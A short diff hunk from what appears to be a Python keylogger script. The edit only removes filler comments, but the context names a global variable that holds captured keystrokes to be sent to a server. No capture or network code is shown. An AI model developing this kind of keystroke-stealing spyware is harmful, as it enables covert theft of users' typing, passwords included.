@@ -7,10 +7,10 @@ import requests
 import json
 #  The Timer module is part of the threading package.
 import threading
-#this is the secon comment
+
+
 #this is a comment
-#this is a third comment
-#this is a fourth comment
+
 # We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
 text = ""
 
